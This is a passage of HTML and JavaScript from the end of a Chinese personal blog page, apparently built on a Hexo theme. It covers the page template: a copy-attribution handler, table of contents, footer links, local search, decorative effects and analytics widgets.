    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: 无心<br />'
            + '文章作者: 无心<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="7286865560"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">无心</a>
            |&nbsp;Powered by&nbsp;梦想
            |&nbsp;About&nbsp;我的博客
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">187.1k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="http://NoobXW.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:wangwei89677@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3012254368" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3012254368" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
            }
        </script>
    

    <!-- 鼠标星星特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
            }
        </script>
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>
